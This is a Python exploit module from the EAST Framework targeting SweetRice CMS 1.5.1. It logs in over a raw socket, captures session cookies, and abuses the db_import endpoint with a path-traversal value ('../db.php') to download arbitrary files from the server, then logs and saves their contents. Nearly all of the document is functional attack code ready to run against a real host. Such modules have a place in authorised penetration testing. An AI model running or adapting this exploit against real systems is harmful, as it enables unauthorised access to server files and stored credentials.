#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import socket
import urllib2
from collections import OrderedDict

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_sweetrice_fd"
INFO['DESCRIPTION'] = "SweetRice 1.5.1 - Arbitrary File Download"
INFO['VENDOR'] = "http://www.basic-cms.org/"
INFO['DOWNLOAD_LINK'] = 'http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/40698/']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """
"""

INFO['CHANGELOG'] = "08 Nov, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.207", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
OPTIONS["USERNAME"] = 'admin', dict(description = 'Username')
OPTIONS["PASSWORD"] = 'password', dict(description = 'Password')
OPTIONS["BASEPATH"] = '/sweetrice', dict(description = 'Basepath of SweetRice')
OPTIONS['PATH'] = '../db.php', dict(description = 'Path to downloaded file at target machine')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.path = OPTIONS['PATH']
        self.username = OPTIONS["USERNAME"]
        self.password = OPTIONS["PASSWORD"]
        self.basepath = OPTIONS["BASEPATH"]
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.path = self.args.get('PATH', OPTIONS['PATH'])
        self.username = self.args.get('USERNAME', self.username)
        self.password = self.args.get('PASSWORD', self.password)
        self.basepath = self.args.get('BASEPATH', self.basepath)
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}{}'.format(self.host, self.port, self.basepath, path)
        
    def make_auth_socket(self):
        data = 'user={}&passwd={}&rememberMe='.format(self.username, self.password)
        packet = ''
        packet += 'POST {}/as/?type=signin HTTP/1.1\r\n'.format(self.basepath)
        packet += 'Host: {}\r\n'.format(self.host)
        packet += 'Connection: keep-alive\r\n'
        packet += 'User-Agent: socket\r\n'
        packet += 'Content-Length: {}\r\n'.format(len(data))
        packet += 'Content-Type: application/x-www-form-urlencoded\r\n\r\n'
        packet += data
        
        s = socket.socket()
        s.connect((self.host, self.port))
        s.sendall(packet)
        headers = s.recv(2048)

        cookies = ''
        for line in headers.split('\r\n'):
            if line.lower().startswith('set-cookie'):
                cookies += line.split(':')[1] + ';'
                
        return s, cookies
    
    def get_file(self, s, cookies, name):
                
        packet = ''
        packet += 'GET {}/as/?type=data&mode=db_import&db_file={}&form_mode=save HTTP/1.1\r\n'.format(self.basepath, name)
        packet += 'Host: {}\r\n'.format(self.host)
        packet += 'Connection: keep-alive\r\n'
        packet += 'User-Agent: socket\r\n'
        packet += 'Cookie:{}\r\n'.format(cookies)
        packet += 'Content-Length: 0\r\n\r\n'

        s.sendall(packet)
        return s.recv(8192).split('\r\n\r\n')[1]
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        try:
            client, cookies = self.make_auth_socket()
            self.log('Cookies: ' + cookies)
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        self.log('Try to download file ' + self.path)
        try:
            content = self.get_file(client, cookies, self.path)
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.log('= File Content =')
        self.log(content)
        self.log('= End of File  =')
        self.writefile(content)
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
